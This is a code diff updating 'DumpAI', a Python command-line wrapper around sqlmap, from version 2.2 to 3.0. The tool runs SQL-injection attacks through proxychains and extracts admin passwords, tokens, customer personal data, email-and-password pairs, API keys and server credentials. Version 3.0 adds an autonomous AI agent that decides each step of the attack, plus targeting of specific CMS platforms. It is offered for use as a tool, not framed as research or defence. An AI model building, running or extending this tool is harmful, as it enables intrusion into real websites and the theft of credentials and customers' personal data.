@@ -1,8 +1,14 @@
 #!/usr/bin/env python3
 """
-DumpAI v2.2 - AI-Powered Autonomous Data Extractor
+DumpAI v3.0 - AI-Powered Autonomous Data Extractor
 
-Intelligent data extraction with category-based filtering:
+Full AI Integration inspired by hackingBuddyGPT:
+- AI makes decisions at EVERY stage
+- Reason → Act → Observe → Adapt cycle
+- Dynamic strategy adaptation
+- Intelligent error recovery
+
+Categories:
 - user_data: Admin accounts, employees, logins, passwords, tokens
 - customer_data: Customer PII (names, addresses, phones, emails)
 - email_pass: Email + password/hash pairs only
@@ -11,19 +17,6 @@ Intelligent data extraction with category-based filtering:
 
 Usage:
     python3 dumpai.py -c "sqlmap command..." [options]
-
-Examples:
-    # Extract admin data and system credentials
-    python3 dumpai.py -c "proxychains4 -q python3 sqlmap.py -r req.txt -p id" --user-data --sys-data
-
-    # Extract everything
-    python3 dumpai.py -c "proxychains4 -q python3 sqlmap.py -r req.txt -p id" --all
-
-    # Only email+password pairs
-    python3 dumpai.py -c "proxychains4 -q python3 sqlmap.py -r req.txt -p id" --email-pass
-
-    # Resume from saved session
-    python3 dumpai.py --resume session_20241213_120000.json
 """
 
 import argparse
@@ -34,13 +27,13 @@ _dir = os.path.dirname(os.path.abspath(__file__))
 if _dir not in sys.path:
     sys.path.insert(0, _dir)
 
-from agent import DumpAgent
+from agent_v3 import DumpAgentV3
 from memory import Memory
 
 
 def main():
     parser = argparse.ArgumentParser(
-        description="DumpAI v2.2 - AI-Powered Autonomous Data Extractor",
+        description="DumpAI v3.0 - AI-Powered Autonomous Agent",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Categories:
@@ -51,9 +44,18 @@ Categories:
   --sys-data      System access (DB creds, phpMyAdmin, FTP, SSH)
   --all           All categories
 
+Default: --user-data --api-key --sys-data
+
+v3.0 Features:
+  - AI at every stage (not just CMS detection)
+  - Dynamic strategy adaptation
+  - Intelligent error recovery
+  - hackingBuddyGPT-inspired architecture
+
 Examples:
-  python3 dumpai.py -c "proxychains4 -q python3 sqlmap.py -r req.txt -p id" --all
-  python3 dumpai.py -c "sqlmap -r request.txt -p param -D mydb" --user-data --sys-data
+  python3 dumpai.py -c "sqlmap -r req.txt -p id"
+  python3 dumpai.py -c "sqlmap -r req.txt -p id" --all
+  python3 dumpai.py -c "sqlmap -r req.txt -p id" --cms prestashop
         """
     )
     
@@ -79,12 +81,13 @@ Examples:
                         help="Max parallel extractions (default: 5)")
     parser.add_argument("-v", "--verbose", action="store_true",
                         help="Verbose output")
-    parser.add_argument("--smart-search", action="store_true",
-                        help="Force Smart Search mode (auto-enabled for blind injections)")
     parser.add_argument("-mr", "--max-rows", type=int, default=0,
                         help="Max rows to dump per table (0 = unlimited)")
-    parser.add_argument("--no-parallel", action="store_true",
-                        help="Disable parallel SQLMap processes")
+    
+    parser.add_argument("--cms", metavar="CMS_NAME",
+                        help="Override CMS detection (prestashop, wordpress, magento)")
+    parser.add_argument("--prefix", metavar="PREFIX",
+                        help="Override table prefix (e.g., ps_, wp_)")
     
     parser.add_argument("--resume", metavar="SESSION_FILE",
                         help="Resume from saved session file")
@@ -121,19 +124,19 @@ Examples:
             categories.append("sys_data")
     
     if not categories:
-        categories = ["user_data", "sys_data"]
-        print(f"[*] No categories specified, using default: {categories}")
+        categories = ["user_data", "api_key", "sys_data"]
+        print(f"[*] Using default categories: {categories}")
     
     try:
-        agent = DumpAgent(
+        agent = DumpAgentV3(
             command=args.command,
             categories=categories,
             output_dir=args.output,
             max_parallel=args.parallel,
             verbose=args.verbose,
-            smart_search=args.smart_search,
             max_rows=args.max_rows,
-            parallel_sqlmap=not args.no_parallel
+            cms_override=args.cms,
+            prefix_override=args.prefix
         )
         
         agent.run()
